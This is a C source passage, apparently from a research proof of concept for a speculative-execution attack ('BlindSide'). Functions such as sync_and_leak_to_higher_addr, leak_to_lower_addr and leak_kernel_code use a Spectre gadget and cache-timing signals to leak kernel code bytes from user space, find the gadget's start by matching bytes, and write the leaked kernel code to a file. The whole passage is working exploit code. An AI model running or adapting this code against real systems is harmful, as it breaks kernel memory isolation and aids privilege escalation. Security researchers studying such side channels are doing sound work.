  int hit_sequence = 0;
  int use_specex_socket = -1;
  while (kernel_addr >= kernel_base_addr) {
    if (kernel_addr % 0x1000 >= 0x7fe && kernel_addr % 0x1000 <= 0x924) {
      use_specex_socket = specex_socket_first;
    } else {
      use_specex_socket = specex_socket_second;
    }
    int picked_cacheline_idx = rand() % 64;
    unsigned long kernel_signal_addr = physmap_page + picked_cacheline_idx*0x40;
    kernel_signal_addr -= SYNC_VALUE << 3;

    write_spectre_data(use_specex_socket, spectre_gadget_addr, kernel_signal_addr, kernel_addr);

    int got_hit = specex_check_signal_fr(8, 1, user_page + picked_cacheline_idx*0x40);
    if (got_hit) {
      hit_sequence += 1;

      if (hit_sequence == 5) { // 10
        return kernel_addr;
      }

      // try same kernel_addr again with a different cacheline_idx
      continue;
    }

    // move to next dword
    kernel_addr -= 1;
    hit_sequence = 0;
  }

  return 0xfffffffffffffffful;
}

void init_specex_leaks() {
  // init primitives
  init_specex_utils();
}

void close_specex_leaks() {
  // XXX
}

void init_matrices() {
  kernel_search_cache = create_matrix(NUM_EVICSETS, NUM_CACHELINES_PAGE);
  kernel_search_test_evicsets = create_matrix(KERNEL_SEARCH_NUM_CACHELINES, NUM_EVICSETS);
  heap_search_cache = create_matrix(NUM_EVICSETS, NUM_CACHELINES_PAGE);
  heap_search_test_evicsets = create_matrix(HEAP_SEARCH_NUM_CACHELINES, NUM_EVICSETS);
}


char* kernel_code_bytes = NULL;
char* leaked_code_bytes_table = NULL;
unsigned long kernel_code_size = 0;

void get_kernel_code_bytes(char** __kernel_code_bytes, unsigned long *__code_size) {
  *__kernel_code_bytes = kernel_code_bytes;
  *__code_size = kernel_code_size;
}

int sync_and_leak_to_higher_addr(unsigned long spectre_gadget_addr, unsigned long kernel_base, unsigned long user_page,
      unsigned long physmap_page, unsigned long curr_addr, unsigned long leak_until_addr, unsigned long *new_addr, unsigned long *new_addr_value) {
  struct timespec total_exec_start;
  struct timespec total_exec_finish;
  double total_exec_elapsed;

  int num_tries;

  unsigned long start_addr = leak_until_addr; // curr_addr;
  curr_addr -= 4; // step into problematic byte

  // seek <0x8 dword + verify
  unsigned long synced_kernel_addr;

start_sync:
  num_tries = 0;
  do {
    synced_kernel_addr = find_sync_point(spectre_gadget_addr, kernel_base, user_page, physmap_page, curr_addr);
    num_tries += 1;
    if (synced_kernel_addr == 0xfffffffffffffffful) {
      use_int0x80 = (use_int0x80 + 1) % 2;
    }
  } while (synced_kernel_addr == 0xfffffffffffffffful && num_tries < 10);
  if (synced_kernel_addr == 0xfffffffffffffffful) {
    printf("[.]  >> failed to find sync point\n");
    return -1;
  }

  // leak 3 lower bits of <0x8 dword
  unsigned long leaked_byte;
  num_tries = 0;
  do {
    leaked_byte = leak_byte_left_1byte(spectre_gadget_addr, user_page, physmap_page, synced_kernel_addr+1, SYNC_VALUE >> 8);
    num_tries += 1;
    if (leaked_byte == 0xfffffffffffffffful) {
      use_int0x80 = (use_int0x80 + 1) % 2;
    }
  } while (leaked_byte == 0xfffffffffffffffful && num_tries < 10);
  if (leaked_byte == 0xfffffffffffffffful) {
    printf("[.]  >> Failed to get lower three bits with leak_byte_left_1byte(..)\n");
    printf("[.]  >> restart syncing..\n");
    curr_addr = synced_kernel_addr - 1;
    goto start_sync;
  }
  unsigned long synced_dword = (SYNC_VALUE & 0xffffff00ul) | (leaked_byte & 0xff);
  printf("[.]  >> synchronized at 0x%lx with value 0x%08lx\n", synced_kernel_addr, synced_dword);
  printf("[.]  >> leaking towards higher addresses from synchronized point..\n");

  // malloc leak size
  size_t leaked_bytes_array_size = start_addr - synced_kernel_addr;

  // initialize leaked_bytes
  *(unsigned int*) &kernel_code_bytes[synced_kernel_addr-kernel_base] = synced_dword;
  *(unsigned int*) &leaked_code_bytes_table[synced_kernel_addr-kernel_base] = 0x01010101;
  size_t num_leaked_bytes = 4;

  // leak towards higher addresses and fill malloc'ed mem
  curr_addr = synced_kernel_addr;
  unsigned long val_at_addr = synced_dword;
  unsigned long right_byte = 0;
  num_tries = 0;

  unsigned long last_failure_addr = 0;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
  while (num_leaked_bytes < leaked_bytes_array_size) {
    if ((num_leaked_bytes-4) % 0x100 == 0) {
      clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
      total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
      total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
      printf("\r[.]  >> leaking @ 0x%lx - #leaked_bytes=0x%lx - elapsed_time_in_range=%.3f sec", curr_addr+3, num_leaked_bytes-4, total_exec_elapsed);
      fflush(stdout);
    }

    right_byte = leak_byte_right_1byte(spectre_gadget_addr, user_page, physmap_page, curr_addr, val_at_addr);
    if (right_byte == 0xfffffffffffffffful) {
      num_tries += 1;
      use_int0x80 = (use_int0x80 + 1) % 2;

      if (last_failure_addr == 0 && num_tries == 1) {
        last_failure_addr = curr_addr;
        curr_addr -= 3;
        num_leaked_bytes -= 3;
        val_at_addr = *(unsigned int*) &kernel_code_bytes[curr_addr - kernel_base];
      }

      if (num_tries < 100) {
        continue;
      }

      break;
    }
    if (last_failure_addr > 0 && last_failure_addr == curr_addr) {
      last_failure_addr = 0;
      num_tries = 0;
    }

    kernel_code_bytes[curr_addr+4 - kernel_base] = right_byte & 0xff;
    leaked_code_bytes_table[curr_addr+4 - kernel_base] = 1;
    val_at_addr = (val_at_addr >> 8) | ((right_byte & 0xff) << 24);

    num_leaked_bytes += 1;
    curr_addr += 1;
  }
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
  total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
  printf("\r[.]  >> leaking @ 0x%lx - #leaked_bytes=0x%lx - elapsed_time_in_range=%.3f sec\n", curr_addr+3, num_leaked_bytes-4, total_exec_elapsed);

  if (new_addr) {
    *new_addr = synced_kernel_addr;
  }
  if (new_addr_value) {
    *new_addr_value = synced_dword;
  }

  return 0;
}

void leak_to_lower_addr(unsigned long spectre_gadget_addr, unsigned long kernel_base, unsigned long *anchor, unsigned long val_at_anchor, unsigned long user_page, unsigned long physmap_page) {
  struct timespec total_exec_start;
  struct timespec total_exec_finish;
  double total_exec_elapsed;

  unsigned long curr_addr = *anchor;
  unsigned long value_at_addr = val_at_anchor;

  unsigned long last_failure_addr = 0x0;
  int failures = 0;
  int total_failures = 0;

  // find bytes doing left slide
  printf("[.]  >> leaking towards lower addresses from synchronized point..\n");

  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
  while (curr_addr > kernel_base) {
    if ((*anchor - curr_addr) % 0x2000 == 0) {
      clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
      total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
      total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
      printf("\r[.]  >> leaking @ 0x%lx - #leaked_bytes=0x%lx - elapsed_time_in_range=%.3f sec", curr_addr, *anchor - curr_addr, total_exec_elapsed);
      fflush(stdout);
    }

    unsigned long leaked_byte = leak_byte_left_1byte(spectre_gadget_addr, user_page, physmap_page, curr_addr, value_at_addr);
    if (leaked_byte == 0xffffffffffffffff) {
      use_int0x80 = (use_int0x80+1) % 2;

      failures++;
      total_failures++;
      if (last_failure_addr == 0x0) {
        last_failure_addr = curr_addr;
      }

      curr_addr = last_failure_addr+4;
      value_at_addr = *(unsigned int*) &kernel_code_bytes[last_failure_addr+4-kernel_base];

      if (failures == 15) {
        break;
      } else {
        // re-try from saved prev prev address and value
        continue;
      }
    }
    if (last_failure_addr == curr_addr) {
      failures = 0;
      last_failure_addr = 0x0;
    }

    kernel_code_bytes[curr_addr-1-kernel_base] = leaked_byte & 0xff;
    leaked_code_bytes_table[curr_addr-1-kernel_base] = 1;

    curr_addr -= 1;
    value_at_addr = ((value_at_addr & 0x00ffffff) << 8) | (leaked_byte & 0xff);

    if (curr_addr == kernel_base) {
      break;
    }
  }
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);
  total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
  if (last_failure_addr == 0x0) {
    printf("\r[.]  >> leaking @ 0x%lx - #leaked_bytes=0x%lx - elapsed_time_in_range=%.3f sec\n", curr_addr, *anchor - curr_addr, total_exec_elapsed);
  }else {
    printf("\r[.]  >> leaking @ 0x%lx - #leaked_bytes=0x%lx - elapsed_time_in_range=%.3f sec\n", last_failure_addr, *anchor - last_failure_addr, total_exec_elapsed);
    printf("[.]  >> failed leaking at 0x%lx\n", last_failure_addr-1);
  }

  *anchor = curr_addr;
}

unsigned long find_spectre_gadget_start(unsigned long spectre_gadget_addr, unsigned long kernel_base, unsigned long code_size, unsigned long user_page, unsigned long physmap_page) {
  printf("\n[.] searching for actual start of spectre gadget..\n");

  kernel_code_size = code_size;

  kernel_code_bytes = (char*) malloc(kernel_code_size*sizeof(char));
  memset(kernel_code_bytes, 0x0, kernel_code_size);

  leaked_code_bytes_table = (char*) malloc(kernel_code_size*sizeof(char));
  memset(leaked_code_bytes_table, 0x0, kernel_code_size);

#if SKIP_LEAKING_KERNEL_CODE
  printf("[.]  >> (user configured to skip leaking with BlindSide)\n");
  get_bytes((void*)(spectre_gadget_addr - 0x100), kernel_code_bytes + (spectre_gadget_addr - kernel_base - 0x100), 0x200ul);
#else
  printf("[.]  >> allocated buffer to store leaked bytes\n");
  printf("[.]  >> using spectre gadget @ 0x%lx for leaking\n", spectre_gadget_addr);
  printf("[.]  >> leaking bytes around spectre gadget\n");

  struct timespec total_exec_start;
  struct timespec total_exec_finish;
  double total_exec_elapsed;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
  sync_and_leak_to_higher_addr(spectre_gadget_addr, kernel_base, user_page, physmap_page, spectre_gadget_addr, spectre_gadget_addr + 0x100, NULL, NULL);
  printf("[.]  >> checking for actual start of spectre gadget within the range of leaked code bytes\n");
#endif

  char mov_r13_rdi[7] = {0x4C, 0x8B, 0xA7, 0xF8, 0x02, 0x00, 0x00};
  unsigned long i, b;
  unsigned long koffset_spectre_gadget_start = 0xfffffffffffffffful;
  for (i = spectre_gadget_addr - kernel_base; i < spectre_gadget_addr - kernel_base + 0x100; i++) {
    int found = 1;
    for (b = 0; b < sizeof(mov_r13_rdi); b++) {
      if(kernel_code_bytes[i+b] != mov_r13_rdi[b]) {
        found = 0;
        break;
      }
    }
    if (found) {
      koffset_spectre_gadget_start = i;
      break;
    }
  }
  if (koffset_spectre_gadget_start == 0xfffffffffffffffful) {
    printf("[.]  >> failed to find spectre gadget start.. exiting..\n");
    exit(1);
  }

#if !SKIP_LEAKING_KERNEL_CODE
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);

  total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished searching in %.3f sec\n", total_exec_elapsed);
#endif

  free(kernel_code_bytes);
  free(leaked_code_bytes_table);
  kernel_code_size = 0x0;

  printf("[.]  >> actual start of spectre gadget = 0x%lx\n", kernel_base + koffset_spectre_gadget_start);
  printf("[.] searching for actual start of spectre gadget.. DONE\n");

  return kernel_base + koffset_spectre_gadget_start;
}

void leak_kernel_code_in_range(unsigned long spectre_gadget_addr, unsigned long kernel_base, unsigned long *anchor, unsigned long user_page, unsigned long physmap_page) {
  unsigned long new_addr=0;
  unsigned long new_addr_value=0;

  sync_and_leak_to_higher_addr(spectre_gadget_addr, kernel_base, user_page, physmap_page, *anchor, *anchor, &new_addr, &new_addr_value);
  *anchor = new_addr;

  leak_to_lower_addr(spectre_gadget_addr, kernel_base, anchor, new_addr_value, user_page, physmap_page);
}

void leak_kernel_code(unsigned long spectre_gadget_addr, unsigned long kernel_base, unsigned long code_size, unsigned long user_page, unsigned long physmap_page) {
  printf("\n[.] leaking kernel code..\n");

  kernel_code_size = code_size;

  kernel_code_bytes = (char*) malloc(kernel_code_size*sizeof(char));
  memset(kernel_code_bytes, 0x0, kernel_code_size);

  leaked_code_bytes_table = (char*) malloc(kernel_code_size*sizeof(char));
  memset(leaked_code_bytes_table, 0x0, kernel_code_size);

#if SKIP_LEAKING_KERNEL_CODE
  printf("[.]  >> (user configured to skip leaking with BlindSide)\n");
  get_bytes((void*)kernel_base, kernel_code_bytes, code_size);
  memset(leaked_code_bytes_table, 0x1, kernel_code_size);
#else
  printf("[.]  >> allocated buffer to store leaked bytes\n");
  printf("[.]  >> using spectre gadget @ 0x%lx for leaking\n", spectre_gadget_addr);
  printf("[.]  >> leaking bytes in range: 0x%lx - 0x%lx\n", kernel_base, kernel_base+kernel_code_size);
  unsigned long anchor = kernel_base + kernel_code_size;
  unsigned long prev_anchor = 0;
  int tmp_count = 0;

  struct timespec total_exec_start;
  struct timespec total_exec_finish;
  double total_exec_elapsed;
  clock_gettime(CLOCK_MONOTONIC, &total_exec_start);
  do {
    prev_anchor = anchor;
    leak_kernel_code_in_range(spectre_gadget_addr, kernel_base, &anchor, user_page, physmap_page);
  } while(anchor != prev_anchor && anchor > kernel_base && tmp_count++ < 1);
  clock_gettime(CLOCK_MONOTONIC, &total_exec_finish);

  total_exec_elapsed = (total_exec_finish.tv_sec - total_exec_start.tv_sec);
  total_exec_elapsed += (total_exec_finish.tv_nsec - total_exec_start.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished leaking in %.3f sec\n", total_exec_elapsed);
#endif

  const char *fname = "dumped_left_sliding_bytes.out";
  FILE* f = fopen(fname, "w");

  unsigned long num_leaked_bytes = 0;
  int i;
  for (i = 0; i < kernel_code_size; i++) {
    if (leaked_code_bytes_table[i]) {
      num_leaked_bytes += 1;
      fprintf(f, "%02X ", kernel_code_bytes[i] & 0xff);
    } else {
      fprintf(f, "xx ");
    }
  }

  fclose(f);

  printf("[.]  >> total #leaked_bytes=%lu=0x%lx - #missing_bytes=%lu=0x%lx\n", num_leaked_bytes, num_leaked_bytes, kernel_code_size - num_leaked_bytes, kernel_code_size - num_leaked_bytes);
  printf("[.] leaking kernel code.. DONE\n");
}
